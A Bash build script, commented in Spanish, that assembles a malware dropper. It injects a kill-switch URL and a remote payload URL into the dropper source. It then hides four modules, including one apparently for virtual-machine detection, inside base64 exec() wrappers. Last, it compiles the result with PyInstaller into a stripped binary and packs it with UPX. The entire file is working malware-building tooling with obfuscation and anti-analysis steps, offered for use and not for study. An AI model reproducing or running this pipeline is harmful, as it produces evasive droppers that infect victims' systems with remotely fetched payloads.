#!/usr/bin/env bash
# builder — Configura, ofusca y compila el dropper.
# Uso: ./builder <killswitch_url> <payload_url>

set -euo pipefail

if [ "$#" -ne 2 ]; then
    echo "Uso: $0 <killswitch_url> <payload_url>"
    exit 1
fi

KILLSWITCH_URL="$1"
PAYLOAD_URL="$2"
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
WORK_DIR="$(mktemp -d)"
BINARY_NAME="dropper_bin"

echo "[*] Copiando fuentes a directorio temporal: $WORK_DIR"
cp "$SCRIPT_DIR/dropper.py"    "$WORK_DIR/"
cp "$SCRIPT_DIR/killswitch.py" "$WORK_DIR/"
cp "$SCRIPT_DIR/vm_detect.py"  "$WORK_DIR/"
cp "$SCRIPT_DIR/payload.py"    "$WORK_DIR/"

# ── 1. Inyectar URLs ─────────────────────────────────────────────────────────
echo "[*] Inyectando configuración..."
sed -i \
    -e "s|KILLSWITCH_URL_PLACEHOLDER|${KILLSWITCH_URL}|g" \
    -e "s|PAYLOAD_URL_PLACEHOLDER|${PAYLOAD_URL}|g" \
    "$WORK_DIR/dropper.py"

# ── 2. Ofuscación: wrapper base64 + marshal ───────────────────────────────────
echo "[*] Ofuscando código fuente..."
python3 - <<EOF
import base64, os

src_dir = "$WORK_DIR"
modules = ["killswitch.py", "vm_detect.py", "payload.py", "dropper.py"]

for mod in modules:
    path = os.path.join(src_dir, mod)
    with open(path, "r") as f:
        source = f.read()
    encoded = base64.b64encode(source.encode()).decode()
    obf = (
        "import base64 as _b64\n"
        f"_src = _b64.b64decode('{encoded}').decode()\n"
        "exec(compile(_src, '<string>', 'exec'))\n"
    )
    with open(path, "w") as f:
        f.write(obf)

print("[+] Ofuscación completada")
EOF

# ── 3. Instalar dependencias ──────────────────────────────────────────────────
echo "[*] Instalando dependencias..."
pip install --quiet requests pyinstaller 2>/dev/null || \
pip install --quiet --break-system-packages requests pyinstaller

# ── 4. Compilar con PyInstaller ───────────────────────────────────────────────
echo "[*] Compilando binario nativo con PyInstaller..."
cd "$WORK_DIR"
python3 -m PyInstaller \
    --onefile \
    --name "$BINARY_NAME" \
    --distpath "$SCRIPT_DIR/dist" \
    --workpath "$WORK_DIR/build" \
    --specpath "$WORK_DIR" \
    --hidden-import requests \
    --hidden-import urllib.request \
    --hidden-import ctypes \
    --hidden-import mmap \
    --strip \
    --log-level WARN \
    "$WORK_DIR/dropper.py"

# ── 5. Comprimir con UPX si está disponible ───────────────────────────────────
if command -v upx &>/dev/null; then
    echo "[*] Comprimiendo con UPX..."
    upx --best "$SCRIPT_DIR/dist/$BINARY_NAME" 2>/dev/null || true
fi

# ── 6. Limpieza ────────────────────────────────────────────────────────────────
rm -rf "$WORK_DIR"
echo "[+] Binario generado en: $SCRIPT_DIR/dist/$BINARY_NAME"
